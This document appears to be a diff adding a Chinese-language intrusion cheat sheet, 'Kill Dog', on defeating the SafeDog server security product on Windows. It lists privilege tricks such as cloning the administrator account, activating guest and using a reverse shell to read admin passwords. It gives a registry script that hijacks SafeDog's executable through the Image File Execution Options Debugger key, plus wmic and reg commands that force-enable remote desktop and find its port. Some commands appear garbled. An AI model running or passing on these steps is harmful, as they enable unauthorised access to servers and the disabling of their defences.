@@ -1,0 +1,44 @@
+Kill Dog：
+
+1.安全狗默认只拦截加管理组，不拦截加用户
+  法a：利用用户克隆exp：直接克隆administrator的权限
+  法b：反弹shell读取管理员密码
+  法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭
+2.安全狗账号防护最严程度：拦截添加用户
+  法a：激活guest，然后克隆用户
+  法b：反弹shell读取管理员密码
+  法c：改注册表，重启服务器，关闭安全狗
+
+
+redegit.reg脚本内容：
+Windows Registry Editor Version 5.00 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe]
+"Debugger"="C:\WWW\l.php"
+
+
+
+ 开启的3389方法：
+1.通用开3389(优化后)：
+  wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+2.For Win2003:
+  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+3.For Win2008:
+  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+4.For Every:
+  cmd开3389 win08 win03 win7 win2012 winxp
+  win08，三条命令即可:
+  wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+  wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
+  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+  win2012通用；win7前两条即可。权限需要run as administrator。
+
+
+
+
+  查询终端端口 ：
+  REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+  (or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号
+  (or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds cp 中PortNumber的值
+
+
